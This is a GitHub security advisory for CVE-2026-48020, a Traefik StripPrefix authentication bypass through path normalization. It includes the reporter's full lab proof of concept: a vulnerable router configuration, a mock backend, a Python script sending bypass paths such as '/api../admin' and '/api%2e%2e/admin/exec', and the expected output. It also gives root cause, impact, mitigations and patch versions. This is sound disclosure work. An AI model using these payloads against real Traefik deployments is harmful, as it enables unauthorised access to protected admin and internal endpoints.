# [H] Traefik has a StripPrefix Route-Level Auth Bypass via Path Normalization

## Summary
Severity: High
Advisory: GHSA-xf64-8mw2-4gr2
CVE: CVE-2026-48020
CWE: CWE-22, CWE-288
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N (CVSS_V3)
Published: 2026-06-11
Source: https://github.com/advisories/GHSA-xf64-8mw2-4gr2
Type: github-advisory

## Affected
- Go: `github.com/traefik/traefik/v2` — affected >=0 <2.11.48
- Go: `github.com/traefik/traefik/v3` — affected >=0 <3.6.19
- Go: `github.com/traefik/traefik/v3` — affected >=3.7.0-ea.1 <3.7.3

## Details
## Summary

There is a high severity vulnerability in Traefik's `StripPrefix` middleware that allows an unauthenticated attacker to bypass route-level authentication and authorization. When a public router matches on a `PathPrefix` rule and applies the `StripPrefix` middleware, a request path containing `..` or its percent-encoded form `%2e%2e` can match the public route at routing time and then, after the prefix is stripped and the path is normalized, resolve to a path served by a separate, authenticated router. As a result, an attacker can reach protected backend paths — such as admin or internal configuration endpoints — without satisfying the authentication middleware attached to the protected router.

## Patches

- https://github.com/traefik/traefik/releases/tag/v2.11.48
- https://github.com/traefik/traefik/releases/tag/v3.6.19
- https://github.com/traefik/traefik/releases/tag/v3.7.3

## For more information

If there are any questions or comments about this advisory, please [open an issue](https://github.com/traefik/traefik/issues).

<details>
<summary>Original Description</summary>

# Traefik StripPrefix Route-Level Auth Bypass via Path Normalization (/api../)

## Summary

A route-level authentication/authorization bypas was found in Traefik when `PathPrefix`-based public routes are combined with `StripPrefix`.

A request using `/api../` or `/api%2e%2e/` can avoid protected router rules at the routing stage, but after `StripPrefix`, the path is normalized and forwarded to the backend as a protected path such as `/admin` or `/internal/config`.

This is reproducible on patched/latest Traefik versions and appears related to, but distinct from, previously disclosed `StripPrefixRegex` / path-normalization issues.

This report specifically affects `StripPrefix`.

## Affected Versions Tested

| Image | Observed Version | Result |
|---|---|---|
| `traefik:v2.11` | `v2.11.46` | Affected |
| `traefik:v3.6` | `v3.6.17` | Affected |
| `traefik:latest` | `v3.7.1` | Affected |

### Lab Contrast

| Image | Result |
|---|---|
| `traefik:v2.10` | Not reproduced in lab |
| `traefik:v3.5` | Not reproduced in lab |

## Vulnerable Configuration Pattern

The issue appears when:

- a broad public route strips a prefix
- while a separate protected route is intended to guard internal/admin paths

```yaml
http:
  routers:
    public-api:
      rule: 'PathPrefix(`/api`) && !PathPrefix(`/api/admin`) && !PathPrefix(`/api/internal`)'
      entryPoints:
        - web
      middlewares:
        - strip-api
      service: backend

    protected:
      rule: 'PathPrefix(`/admin`) || PathPrefix(`/internal`)'
      entryPoints:
        - web
      middlewares:
        - auth
      service: backend

  middlewares:
    strip-api:
      stripPrefix:
        prefixes:
          - /api

    auth:
      basicAuth:
        users:
          - 'test:$apr1$H6uskkkW$IgXLP6ewTrSuBkTrqE8wj/'

  services:
    backend:
      loadBalancer:
        servers:
          - url: http://backend:9000
```

## Observed Behavior

### Direct Protected Paths

These are correctly blocked.

| Request | Expected | Observed |
|---|---|---|
| `GET /admin` | Blocked | `401` |
| `GET /internal/config` | Blocked | `401` |

### Expected Public Exclusions

These do not expose protected backend paths.

| Request | Expected | Observed |
|---|---|---|
| `GET /api/admin` | Not routed to protected backend path | `404` |
| `GET /api/internal/config` | Not routed to protected backend path | `404` |

### Bypass Payloads

These reach protected backend paths.

| Request | Observed Status | Backend Receives |
|---|---|---|
| `GET /api../admin` | `200` | `/admin` |
| `GET /api%2e%2e/admin` | `200` | `/admin` |
| `GET /api../internal/config` | `200` | `/internal/config` |
| `GET /api%2e%2e/internal/config` | `200` | `/internal/config` |

## Minimal PoC

### docker-compose.yml

```yaml
services:
  traefik:
    image: traefik:v3.7
    command:
      - --providers.file.filename=/etc/traefik/dynamic.yml
      - --entrypoints.web.address=:8080
      - --accesslog=true
    ports:
      - "127.0.0.1:18080:8080"
    volumes:
      - ./dynamic.yml:/etc/traefik/dynamic.yml:ro
    depends_on:
      - backend

  backend:
    image: python:3.12-slim
    working_dir: /app
    command: python backend.py
    volumes:
      - ./backend.py:/app/backend.py:ro
    expose:
      - "9000"
```

### dynamic.yml

```yaml
http:
  routers:
    public-api:
      rule: 'PathPrefix(`/api`) && !PathPrefix(`/api/admin`) && !PathPrefix(`/api/internal`)'
      entryPoints:
        - web
      middlewares:
        - strip-api
      service: backend

    protected:
      rule: 'PathPrefix(`/admin`) || PathPrefix(`/internal`)'
      entryPoints:
        - web
      middlewares:
        - auth
      service: backend

  middlewares:
    strip-api:
      stripPrefix:
        prefixes:
          - /api

    auth:
      basicAuth:
        users:
          - 'test:$apr1$H6uskkkW$IgXLP6ewTrSuBkTrqE8wj/'

  services:
    backend:
      loadBalancer:
        servers:
          - url: http://backend:9000
```

### backend.py

```python
from http.server import BaseHTTPRequestHandler, HTTPServer
import json

class Handler(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        return

    def _json(self, status, obj):
        body = json.dumps(obj).encode()
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        if self.path == "/admin":
            self._json(200, {
                "seen_path": self.path,
                "secret": "ADMIN_SECRET_REACHED"
            })
        elif self.path == "/internal/config":
            self._json(200, {
                "seen_path": self.path,
                "secret": "TRAEFIK_LAB_INTERNAL_CONFIG"
            })
        elif self.path == "/admin/exec":
            self._json(200, {
                "seen_path": self.path,
                "rce_chain_marker": True,
                "note": "protected execution endpoint reached"
            })
        else:
            self._json(404, {
                "seen_path": self.path,
                "secret": None
            })

HTTPServer(("0.0.0.0", 9000), Handler).serve_forever()
```

### poc.py

```python
#!/usr/bin/env python3
from urllib.request import Request, urlopen
from urllib.error import HTTPError

BASE = "http://127.0.0.1:18080"

PATHS = [
    "/admin",
    "/internal/config",
    "/api/admin",
    "/api/internal/config",
    "/api../admin",
    "/api%2e%2e/admin",
    "/api../internal/config",
    "/api%2e%2e/internal/config",
    "/admin/exec",
    "/api/admin/exec",
    "/api../admin/exec",
    "/api%2e%2e/admin/exec",
]

for path in PATHS:
    req = Request(BASE + path)
    try:
        with urlopen(req, timeout=5) as r:
            status = r.status
            body = r.read().decode(errors="replace")
    except HTTPError as e:
        status = e.code
        body = e.read().decode(errors="replace")

    print(f"{path:28} {status} {body[:180]}")
```

### Run

```bash
docker compose up -d
python3 poc.py
```

## Expected Vulnerable Output

```text
/admin                       401
/internal/config             401
/api/admin                   404
/api/internal/config         404
/api../admin                 200  backend seen_path=/admin
/api%2e%2e/admin             200  backend seen_path=/admin
/api../internal/config       200  backend seen_path=/internal/config
/api%2e%2e/internal/config   200  backend seen_path=/internal/config
/api../admin/exec            200  protected execution endpoint reached
/api%2e%2e/admin/exec        200  protected execution endpoint reached
```

## Root Cause Hypothesis

The vulnerable behavior appears to be caused by path normalization after prefix stripping.

```text
Incoming path:              /api../admin
After StripPrefix("/api"):  /../admin
After JoinPath():           /admin
```

The request does not match the protected `/admin` router at the routing stage, but the backend receives `/admin` after normalization.

The relevant behavior appears related to `StripPrefix` calling `req.URL.JoinPath()` after removing the prefix in newer versions.

## Security Impact

An unauthenticated network attacker can bypass intended Traefik route-level authentication/authorization boundaries and access backend paths that the operator intended to protect with a separate protected router.

Potential impact includes:

- Access to protected admin paths
- Access to internal configuration endpoints
- Exposure of secrets returned by internal backends
- Access to protected backend management functionality
- Conditional RCE if the protected backend exposes an execution primitive

In the local lab, a protected `/admin/exec` endpoint was reachable through `/api../admin/exec`, demonstrating a conditional RCE chain when the backend contains an execution primitive.

This is not a standalone Traefik RCE claim. It is an authentication/authorization boundary bypass that can expose protected backend functionality.

## Suggested Severity

Suggested CVSS is **10.0 Critical** with Scope Changed, because the bypass crosses the Traefik route-level authorization boundary and exposes protected backend functionality.

```text
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N
```

Scope Changed was selected because the request bypasses Traefik's route-level authorization boundary and reaches backend paths that are intended to be protected by a separate authenticated router.

If the vendor treats Traefik and the backend as the same security scope, the score may be interpreted as **9.1 Critical** with Scope Unchanged:

```text
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
```

The issue was submitted with the stronger Scope Changed interpretation, but the maintainers may adjust the final CVSS score during triage.

## Weakness

Primary CWE:

- `CWE-863: Incorrect Authorization`

Related weakness candidates:

- `CWE-180: Incorrect Behavior Order: Validate Before Canonicalize`
- `CWE-22: Improper Limitation of a Pathname to a Restricted Directory`

## Mitigation Verified in Lab

The bypass was blocked when using a stricter prefix boundary:

```text
PathRegexp(`^/api(/|$)`)
```

or:

```text
PathPrefix(`/api/`) with StripPrefix(`/api/`)
```

## Relation to Existing Advisories

This appears related to the same vulnerability family as prior Traefik path normalization / `StripPrefixRegex` bypass advisories, but it affects `StripPrefix` and remains reproducible on patched/latest versions tested above.

This was reported as a possible incomplete fix or bypass variant rather than assuming it is a duplicate.

## Reporter

WonYun / kyun0

</details>

## References
- https://github.com/traefik/traefik/security/advisories/GHSA-xf64-8mw2-4gr2
- https://nvd.nist.gov/vuln/detail/CVE-2026-48020
- https://access.redhat.com/errata/RHSA-2026:62260
- https://access.redhat.com/security/cve/CVE-2026-48020
- https://bugzilla.redhat.com/show_bug.cgi?id=2491915
- https://github.com/traefik/traefik
- https://github.com/traefik/traefik/releases/tag/v2.11.48
- https://github.com/traefik/traefik/releases/tag/v3.6.19
- https://github.com/traefik/traefik/releases/tag/v3.7.3
- https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-48020.json
